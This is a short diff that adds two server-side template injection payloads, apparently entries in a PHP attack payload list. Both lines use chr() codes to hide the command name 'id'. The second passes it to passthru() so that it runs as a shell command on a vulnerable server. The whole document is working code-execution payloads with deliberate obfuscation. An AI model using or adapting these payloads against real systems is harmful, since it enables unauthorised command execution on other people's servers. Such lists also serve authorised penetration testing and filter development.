@@ -1,0 +1,2 @@
+{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}
+{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
